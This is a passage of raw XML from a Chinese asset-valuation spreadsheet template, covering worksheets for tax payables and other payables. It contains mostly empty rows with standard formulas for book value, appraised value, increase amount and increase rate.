    <row r="9" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="587" t="n"/>
      <c r="E9" s="555" t="n"/>
      <c r="F9" s="555" t="n"/>
      <c r="G9" s="555">
        <f>F9-E9</f>
        <v/>
      </c>
      <c r="H9" s="555">
        <f>IF(E9=0,"",G9/E9*100)</f>
        <v/>
      </c>
      <c r="I9" s="383" t="n"/>
    </row>
    <row r="10" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="587" t="n"/>
      <c r="E10" s="555" t="n"/>
      <c r="F10" s="555" t="n"/>
      <c r="G10" s="555">
        <f>F10-E10</f>
        <v/>
      </c>
      <c r="H10" s="555">
        <f>IF(E10=0,"",G10/E10*100)</f>
        <v/>
      </c>
      <c r="I10" s="383" t="n"/>
    </row>
    <row r="11" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="587" t="n"/>
      <c r="E11" s="555" t="n"/>
      <c r="F11" s="555" t="n"/>
      <c r="G11" s="555">
        <f>F11-E11</f>
        <v/>
      </c>
      <c r="H11" s="555">
        <f>IF(E11=0,"",G11/E11*100)</f>
        <v/>
      </c>
      <c r="I11" s="383" t="n"/>
    </row>
    <row r="12" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="587" t="n"/>
      <c r="E12" s="555" t="n"/>
      <c r="F12" s="555" t="n"/>
      <c r="G12" s="555">
        <f>F12-E12</f>
        <v/>
      </c>
      <c r="H12" s="555">
        <f>IF(E12=0,"",G12/E12*100)</f>
        <v/>
      </c>
      <c r="I12" s="383" t="n"/>
    </row>
    <row r="13" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="587" t="n"/>
      <c r="E13" s="555" t="n"/>
      <c r="F13" s="555" t="n"/>
      <c r="G13" s="555">
        <f>F13-E13</f>
        <v/>
      </c>
      <c r="H13" s="555">
        <f>IF(E13=0,"",G13/E13*100)</f>
        <v/>
      </c>
      <c r="I13" s="383" t="n"/>
    </row>
    <row r="14" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="587" t="n"/>
      <c r="E14" s="555" t="n"/>
      <c r="F14" s="555" t="n"/>
      <c r="G14" s="555">
        <f>F14-E14</f>
        <v/>
      </c>
      <c r="H14" s="555">
        <f>IF(E14=0,"",G14/E14*100)</f>
        <v/>
      </c>
      <c r="I14" s="383" t="n"/>
    </row>
    <row r="15" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="587" t="n"/>
      <c r="E15" s="555" t="n"/>
      <c r="F15" s="555" t="n"/>
      <c r="G15" s="555">
        <f>F15-E15</f>
        <v/>
      </c>
      <c r="H15" s="555">
        <f>IF(E15=0,"",G15/E15*100)</f>
        <v/>
      </c>
      <c r="I15" s="383" t="n"/>
    </row>
    <row r="16" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="587" t="n"/>
      <c r="E16" s="555" t="n"/>
      <c r="F16" s="555" t="n"/>
      <c r="G16" s="555">
        <f>F16-E16</f>
        <v/>
      </c>
      <c r="H16" s="555">
        <f>IF(E16=0,"",G16/E16*100)</f>
        <v/>
      </c>
      <c r="I16" s="383" t="n"/>
    </row>
    <row r="17" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="587" t="n"/>
      <c r="E17" s="555" t="n"/>
      <c r="F17" s="555" t="n"/>
      <c r="G17" s="555">
        <f>F17-E17</f>
        <v/>
      </c>
      <c r="H17" s="555">
        <f>IF(E17=0,"",G17/E17*100)</f>
        <v/>
      </c>
      <c r="I17" s="383" t="n"/>
    </row>
    <row r="18" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="587" t="n"/>
      <c r="E18" s="555" t="n"/>
      <c r="F18" s="555" t="n"/>
      <c r="G18" s="555">
        <f>F18-E18</f>
        <v/>
      </c>
      <c r="H18" s="555">
        <f>IF(E18=0,"",G18/E18*100)</f>
        <v/>
      </c>
      <c r="I18" s="383" t="n"/>
    </row>
    <row r="19" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="587" t="n"/>
      <c r="E19" s="555" t="n"/>
      <c r="F19" s="555" t="n"/>
      <c r="G19" s="555">
        <f>F19-E19</f>
        <v/>
      </c>
      <c r="H19" s="555">
        <f>IF(E19=0,"",G19/E19*100)</f>
        <v/>
      </c>
      <c r="I19" s="383" t="n"/>
    </row>
    <row r="20" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="587" t="n"/>
      <c r="E20" s="555" t="n"/>
      <c r="F20" s="555" t="n"/>
      <c r="G20" s="555">
        <f>F20-E20</f>
        <v/>
      </c>
      <c r="H20" s="555">
        <f>IF(E20=0,"",G20/E20*100)</f>
        <v/>
      </c>
      <c r="I20" s="383" t="n"/>
    </row>
    <row r="21" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="587" t="n"/>
      <c r="E21" s="555" t="n"/>
      <c r="F21" s="555" t="n"/>
      <c r="G21" s="555">
        <f>F21-E21</f>
        <v/>
      </c>
      <c r="H21" s="555">
        <f>IF(E21=0,"",G21/E21*100)</f>
        <v/>
      </c>
      <c r="I21" s="383" t="n"/>
    </row>
    <row r="22" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="587" t="n"/>
      <c r="E22" s="555" t="n"/>
      <c r="F22" s="555" t="n"/>
      <c r="G22" s="555">
        <f>F22-E22</f>
        <v/>
      </c>
      <c r="H22" s="555">
        <f>IF(E22=0,"",G22/E22*100)</f>
        <v/>
      </c>
      <c r="I22" s="383" t="n"/>
    </row>
    <row r="23" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="587" t="n"/>
      <c r="E23" s="555" t="n"/>
      <c r="F23" s="555" t="n"/>
      <c r="G23" s="555">
        <f>F23-E23</f>
        <v/>
      </c>
      <c r="H23" s="555">
        <f>IF(E23=0,"",G23/E23*100)</f>
        <v/>
      </c>
      <c r="I23" s="383" t="n"/>
    </row>
    <row r="24" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="587" t="n"/>
      <c r="E24" s="555" t="n"/>
      <c r="F24" s="555" t="n"/>
      <c r="G24" s="555">
        <f>F24-E24</f>
        <v/>
      </c>
      <c r="H24" s="555">
        <f>IF(E24=0,"",G24/E24*100)</f>
        <v/>
      </c>
      <c r="I24" s="383" t="n"/>
    </row>
    <row r="25" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="587" t="n"/>
      <c r="E25" s="555" t="n"/>
      <c r="F25" s="555" t="n"/>
      <c r="G25" s="555">
        <f>F25-E25</f>
        <v/>
      </c>
      <c r="H25" s="555">
        <f>IF(E25=0,"",G25/E25*100)</f>
        <v/>
      </c>
      <c r="I25" s="383" t="n"/>
    </row>
    <row r="26" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A26" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B26" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C26" s="567" t="n"/>
      <c r="D26" s="115" t="n"/>
      <c r="E26" s="555">
        <f>ROUND(SUM(E6:E25),2)</f>
        <v/>
      </c>
      <c r="F26" s="555">
        <f>ROUND(SUM(F6:F25),2)</f>
        <v/>
      </c>
      <c r="G26" s="555">
        <f>F26-E26</f>
        <v/>
      </c>
      <c r="H26" s="555">
        <f>IF(E26=0,"",G26/E26*100)</f>
        <v/>
      </c>
      <c r="I26" s="383" t="n"/>
    </row>
    <row r="27" s="415">
      <c r="A27" s="116" t="n"/>
    </row>
    <row r="28" s="415">
      <c r="A28" s="116" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="3">
    <mergeCell ref="B1:I1"/>
    <mergeCell ref="B2:I2"/>
    <mergeCell ref="B26:C26"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:I26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 codeName="Sheet88">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:J27"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="O25" sqref="O25"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="12.5" customWidth="1" style="410" min="1" max="1"/>
    <col width="9.5" customWidth="1" style="410" min="2" max="2"/>
    <col width="27.1666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="17.1666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="19.1666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="7" max="8"/>
    <col outlineLevel="1" width="9.5" customWidth="1" style="410" min="9" max="9"/>
    <col width="15.5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应交税费评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="3" ht="17.2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402" t="inlineStr">
        <is>
          <t>表5-9</t>
        </is>
      </c>
    </row>
    <row r="4" ht="17.25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376" t="n"/>
      <c r="J4" s="402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="17.2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征税机关</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>发生日期</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>税费种类</t>
        </is>
      </c>
      <c r="F5" s="307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7.25" customFormat="1" customHeight="1" s="116">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="180" t="inlineStr">
        <is>
          <t>根据被评估单位所在地确认国家税务总局的全称填列于此</t>
        </is>
      </c>
      <c r="D6" s="587" t="n"/>
      <c r="E6" s="3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7.25" customFormat="1" customHeight="1" s="116">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="587" t="n"/>
      <c r="E7" s="380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7.25" customFormat="1" customHeight="1" s="116">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="587" t="n"/>
      <c r="E8" s="380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7.25" customFormat="1" customHeight="1" s="116">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="587" t="n"/>
      <c r="E9" s="380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7.25" customFormat="1" customHeight="1" s="116">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="587" t="n"/>
      <c r="E10" s="380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7.25" customFormat="1" customHeight="1" s="116">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="587" t="n"/>
      <c r="E11" s="380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7.25" customFormat="1" customHeight="1" s="116">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="587" t="n"/>
      <c r="E12" s="380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7.25" customFormat="1" customHeight="1" s="116">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="587" t="n"/>
      <c r="E13" s="380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7.25" customFormat="1" customHeight="1" s="116">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="587" t="n"/>
      <c r="E14" s="380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7.25" customFormat="1" customHeight="1" s="116">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="587" t="n"/>
      <c r="E15" s="380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7.25" customFormat="1" customHeight="1" s="116">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="587" t="n"/>
      <c r="E16" s="380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7.25" customFormat="1" customHeight="1" s="116">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="587" t="n"/>
      <c r="E17" s="380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7.25" customFormat="1" customHeight="1" s="116">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="587" t="n"/>
      <c r="E18" s="380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7.25" customFormat="1" customHeight="1" s="116">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="587" t="n"/>
      <c r="E19" s="380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7.25" customFormat="1" customHeight="1" s="116">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="587" t="n"/>
      <c r="E20" s="380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7.25" customFormat="1" customHeight="1" s="116">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="587" t="n"/>
      <c r="E21" s="380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7.25" customFormat="1" customHeight="1" s="116">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="587" t="n"/>
      <c r="E22" s="380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7.25" customFormat="1" customHeight="1" s="116">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="587" t="n"/>
      <c r="E23" s="380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7.25" customFormat="1" customHeight="1" s="116">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="587" t="n"/>
      <c r="E24" s="380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7.25" customFormat="1" customHeight="1" s="116">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="587" t="n"/>
      <c r="E25" s="380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7.25" customFormat="1" customHeight="1" s="116">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="587" t="n"/>
      <c r="E26" s="380" t="n"/>
      <c r="F26" s="555" t="n"/>
      <c r="G26" s="555" t="n"/>
      <c r="H26" s="555">
        <f>G26-F26</f>
        <v/>
      </c>
      <c r="I26" s="555">
        <f>IF(F26=0,"",H26/F26*100)</f>
        <v/>
      </c>
      <c r="J26" s="383" t="n"/>
    </row>
    <row r="27" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A27" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B27" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C27" s="567" t="n"/>
      <c r="D27" s="115" t="n"/>
      <c r="E27" s="380" t="n"/>
      <c r="F27" s="555">
        <f>ROUND(SUM(F6:F26),2)</f>
        <v/>
      </c>
      <c r="G27" s="555">
        <f>ROUND(SUM(G6:G26),2)</f>
        <v/>
      </c>
      <c r="H27" s="555">
        <f>G27-F27</f>
        <v/>
      </c>
      <c r="I27" s="555">
        <f>IF(F27=0,"",H27/F27*100)</f>
        <v/>
      </c>
      <c r="J27" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="3">
    <mergeCell ref="B27:C27"/>
    <mergeCell ref="B1:J1"/>
    <mergeCell ref="B2:J2"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:J27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7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 codeName="Sheet89">
    <tabColor rgb="FF92D050"/>
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:H27"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A26" sqref="A26"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="9" customWidth="1" style="410" min="1" max="1"/>
    <col width="8.83333333333333" customWidth="1" style="410" min="2" max="2"/>
    <col hidden="1" width="8.83333333333333" customWidth="1" style="410" min="3" max="3"/>
    <col width="38.1666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="20.6666666666667" customWidth="1" style="410" min="5" max="7"/>
    <col width="17.1666666666667" customWidth="1" style="410" min="8" max="8"/>
    <col width="9" customWidth="1" style="410" min="9" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="30" customFormat="1" customHeight="1" s="368">
      <c r="B1" s="371" t="inlineStr">
        <is>
          <t>其他应付款评估汇总表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="16.5" customHeight="1" s="415">
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="3" ht="16.5" customHeight="1" s="415">
      <c r="B3" s="547" t="n"/>
      <c r="C3" s="547" t="n"/>
      <c r="D3" s="547" t="n"/>
      <c r="E3" s="547" t="n"/>
      <c r="G3" s="402" t="n"/>
      <c r="H3" s="402" t="inlineStr">
        <is>
          <t>表5-10</t>
        </is>
      </c>
    </row>
    <row r="4" ht="16.5" customHeight="1" s="415">
      <c r="B4" s="571">
        <f>'2-分类汇总'!B4</f>
        <v/>
      </c>
      <c r="C4" s="554" t="n"/>
      <c r="D4" s="554" t="n"/>
      <c r="E4" s="376" t="n"/>
      <c r="G4" s="402" t="n"/>
      <c r="H4" s="402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="16.5" customFormat="1" customHeight="1" s="204">
      <c r="B5" s="284" t="inlineStr">
        <is>
          <t>编号</t>
        </is>
      </c>
      <c r="C5" s="284" t="n"/>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>户名（结算对象)</t>
        </is>
      </c>
      <c r="E5" s="620" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="F5" s="552" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="G5" s="552" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="H5" s="552" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
    </row>
    <row r="6" ht="16.5" customHeight="1" s="415">
      <c r="B6" s="284" t="inlineStr">
        <is>
          <t>5-10-1</t>
        </is>
      </c>
      <c r="C6" s="323" t="inlineStr">
        <is>
          <t>应付利息</t>
        </is>
      </c>
      <c r="D6" s="381" t="inlineStr">
        <is>
          <t>其他应付款—应付利息</t>
        </is>
      </c>
      <c r="E6" s="555">
        <f>'5-10-1应付利息'!H27</f>
        <v/>
      </c>
      <c r="F6" s="555">
        <f>'5-10-1应付利息'!I27</f>
        <v/>
      </c>
      <c r="G6" s="555">
        <f>F6-E6</f>
        <v/>
      </c>
      <c r="H6" s="555">
        <f>IF(E6=0,"",G6/E6*100)</f>
        <v/>
      </c>
    </row>
    <row r="7" ht="16.5" customHeight="1" s="415">
      <c r="B7" s="284" t="inlineStr">
        <is>
          <t>5-10-2</t>
        </is>
      </c>
      <c r="C7" s="323" t="inlineStr">
        <is>
          <t>应付股利</t>
        </is>
      </c>
      <c r="D7" s="381" t="inlineStr">
        <is>
          <t>其他应付款—应付股利（应付利润）</t>
        </is>
      </c>
      <c r="E7" s="555">
        <f>'5-10-2应付股利（利润）'!F27</f>
        <v/>
      </c>
      <c r="F7" s="555">
        <f>'5-10-2应付股利（利润）'!G27</f>
        <v/>
      </c>
      <c r="G7" s="555">
        <f>F7-E7</f>
        <v/>
      </c>
      <c r="H7" s="555">
        <f>IF(E7=0,"",G7/E7*100)</f>
        <v/>
      </c>
    </row>
    <row r="8" ht="16.5" customHeight="1" s="415">
      <c r="B8" s="284" t="inlineStr">
        <is>
          <t>5-10-3</t>
        </is>
      </c>
      <c r="C8" s="323" t="inlineStr">
        <is>
          <t>其他应付</t>
        </is>
      </c>
      <c r="D8" s="381" t="inlineStr">
        <is>
          <t>其他应付款—其他应付款</t>
        </is>
      </c>
      <c r="E8" s="555">
        <f>'5-10-3其他应付款'!I29</f>
        <v/>
      </c>
      <c r="F8" s="555">
        <f>'5-10-3其他应付款'!J29</f>
        <v/>
      </c>
      <c r="G8" s="555">
        <f>F8-E8</f>
        <v/>
      </c>
      <c r="H8" s="555">
        <f>IF(E8=0,"",G8/E8*100)</f>
        <v/>
      </c>
    </row>
    <row r="9" ht="16.5" customHeight="1" s="415">
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="380" t="n"/>
      <c r="D9" s="381" t="n"/>
      <c r="E9" s="555" t="n"/>
      <c r="F9" s="555" t="n"/>
      <c r="G9" s="555" t="n"/>
      <c r="H9" s="555" t="n"/>
    </row>
    <row r="10" ht="16.5" customHeight="1" s="415">
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="380" t="n"/>
      <c r="D10" s="381" t="n"/>
      <c r="E10" s="555" t="n"/>
      <c r="F10" s="555" t="n"/>
      <c r="G10" s="555" t="n"/>
      <c r="H10" s="555" t="n"/>
    </row>
    <row r="11" ht="16.5" customHeight="1" s="415">
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="380" t="n"/>
      <c r="D11" s="381" t="n"/>
      <c r="E11" s="555" t="n"/>
      <c r="F11" s="555" t="n"/>
      <c r="G11" s="555" t="n"/>
      <c r="H11" s="555" t="n"/>
    </row>
    <row r="12" ht="16.5" customHeight="1" s="415">
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="380" t="n"/>
      <c r="D12" s="381" t="n"/>
      <c r="E12" s="555" t="n"/>
      <c r="F12" s="555" t="n"/>
      <c r="G12" s="555" t="n"/>
      <c r="H12" s="555" t="n"/>
    </row>
    <row r="13" ht="16.5" customHeight="1" s="415">
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="380" t="n"/>
      <c r="D13" s="381" t="n"/>
      <c r="E13" s="555" t="n"/>
      <c r="F13" s="555" t="n"/>
      <c r="G13" s="555" t="n"/>
      <c r="H13" s="555" t="n"/>
    </row>
    <row r="14" ht="16.5" customHeight="1" s="415">
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="380" t="n"/>
      <c r="D14" s="381" t="n"/>
      <c r="E14" s="555" t="n"/>
      <c r="F14" s="555" t="n"/>
      <c r="G14" s="555" t="n"/>
      <c r="H14" s="555" t="n"/>
    </row>
    <row r="15" ht="16.5" customHeight="1" s="415">
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="380" t="n"/>
      <c r="D15" s="381" t="n"/>
      <c r="E15" s="555" t="n"/>
      <c r="F15" s="555" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="555" t="n"/>
    </row>
    <row r="16" ht="16.5" customHeight="1" s="415">
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="380" t="n"/>
      <c r="D16" s="381" t="n"/>
      <c r="E16" s="555" t="n"/>
      <c r="F16" s="555" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="555" t="n"/>
    </row>
    <row r="17" ht="16.5" customHeight="1" s="415">
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="380" t="n"/>
      <c r="D17" s="381" t="n"/>
      <c r="E17" s="555" t="n"/>
      <c r="F17" s="555" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="555" t="n"/>
    </row>
    <row r="18" ht="16.5" customHeight="1" s="415">
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="380" t="n"/>
      <c r="D18" s="381" t="n"/>
      <c r="E18" s="555" t="n"/>
      <c r="F18" s="555" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="555" t="n"/>
    </row>
    <row r="19" ht="16.5" customHeight="1" s="415">
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="380" t="n"/>
      <c r="D19" s="381" t="n"/>
      <c r="E19" s="555" t="n"/>
      <c r="F19" s="555" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="555" t="n"/>
    </row>
    <row r="20" ht="16.5" customHeight="1" s="415">
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="380" t="n"/>
      <c r="D20" s="381" t="n"/>
      <c r="E20" s="555" t="n"/>
      <c r="F20" s="555" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="555" t="n"/>
    </row>
    <row r="21" ht="16.5" customHeight="1" s="415">
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="380" t="n"/>
      <c r="D21" s="381" t="n"/>
      <c r="E21" s="555" t="n"/>
      <c r="F21" s="555" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="555" t="n"/>
    </row>
    <row r="22" ht="16.5" customHeight="1" s="415">
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="380" t="n"/>
      <c r="D22" s="381" t="n"/>
      <c r="E22" s="555" t="n"/>
      <c r="F22" s="555" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="555" t="n"/>
    </row>
    <row r="23" ht="16.5" customHeight="1" s="415">
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="380" t="n"/>
      <c r="D23" s="381" t="n"/>
      <c r="E23" s="555" t="n"/>
      <c r="F23" s="555" t="n"/>
      <c r="G23" s="555" t="n"/>
      <c r="H23" s="555" t="n"/>
    </row>
    <row r="24" ht="16.5" customHeight="1" s="415">
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="380" t="n"/>
      <c r="D24" s="381" t="n"/>
      <c r="E24" s="555" t="n"/>
      <c r="F24" s="555" t="n"/>
      <c r="G24" s="555" t="n"/>
      <c r="H24" s="555" t="n"/>
    </row>
    <row r="25" ht="16.5" customHeight="1" s="415">
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="380" t="n"/>
      <c r="D25" s="381" t="n"/>
      <c r="E25" s="555" t="n"/>
      <c r="F25" s="555" t="n"/>
      <c r="G25" s="555" t="n"/>
      <c r="H25" s="555" t="n"/>
    </row>
    <row r="26" ht="16.5" customHeight="1" s="415">
      <c r="A26" s="148" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="185" t="inlineStr">
        <is>
          <t>其付汇总</t>
        </is>
      </c>
      <c r="D26" s="114" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="E26" s="555">
        <f>ROUND(SUM(E6:E25),2)</f>
        <v/>
      </c>
      <c r="F26" s="555">
        <f>ROUND(SUM(F6:F25),2)</f>
        <v/>
      </c>
      <c r="G26" s="555">
        <f>F26-E26</f>
        <v/>
      </c>
      <c r="H26" s="555">
        <f>IF(E26=0,"",G26/E26*100)</f>
        <v/>
      </c>
    </row>
    <row r="27" s="415">
      <c r="B27" s="344" t="n"/>
      <c r="C27" s="344" t="n"/>
      <c r="D27" s="347" t="n"/>
      <c r="E27" s="347" t="n"/>
      <c r="F27" s="347" t="n"/>
      <c r="G27" s="347" t="n"/>
      <c r="H27" s="291" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="3">
    <mergeCell ref="B1:H1"/>
    <mergeCell ref="B2:H2"/>
    <mergeCell ref="B4:D4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scale="99" fitToHeight="0" blackAndWhite="1"/>
</worksheet>
</file>

<file path=xl/worksheets/sheet93.xml><?xml version="1.0" encoding="utf-8"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetPr codeName="Sheet90">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:L27"/>
  <sheetViews>
